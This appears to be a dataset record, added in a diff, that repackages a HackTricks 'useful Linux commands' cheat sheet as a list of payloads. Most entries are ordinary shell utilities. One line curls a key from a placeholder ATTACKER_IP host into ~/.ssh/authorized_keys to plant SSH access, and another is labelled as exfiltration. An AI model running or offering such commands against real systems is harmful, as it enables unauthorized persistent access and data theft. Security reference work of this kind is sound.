@@ -1,0 +1,27 @@
+{
+  "id": "linux_hardening_5a3edc542cda",
+  "category": "linux-hardening",
+  "title": "useful linux commands",
+  "description": "# Useful Linux Commands\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Common Bash\n\n```bash\n#Exfiltration using Base64\nbase64 -w 0 file\n\n#Get HexDump without new lines\nxxd -p boot12.bin | tr -d '\\n'\n\n#Add public key to authorized keys\ncurl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys\n\n#Echo without new line and Hex\necho -n -e\n\n#Count\nwc -l <file> #Lines\nwc -c #Chars\n\n#Sort\nsort -nr #Sort by number and then reverse\ncat file | sort | uniq #Sort and delete duplicates\n\n#Replace",
+  "payloads": [
+    "# Useful Linux Commands",
+    "{{#include ../banners/hacktricks-training.md}}",
+    "## Common Bash",
+    "```bash",
+    "#Exfiltration using Base64",
+    "base64 -w 0 file",
+    "#Get HexDump without new lines",
+    "xxd -p boot12.bin | tr -d '\\n'",
+    "#Add public key to authorized keys",
+    "curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys",
+    "#Echo without new line and Hex",
+    "echo -n -e",
+    "#Count",
+    "wc -l <file> #Lines",
+    "wc -c #Chars"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/linux-hardening/useful-linux-commands.md"
+  ]
+}
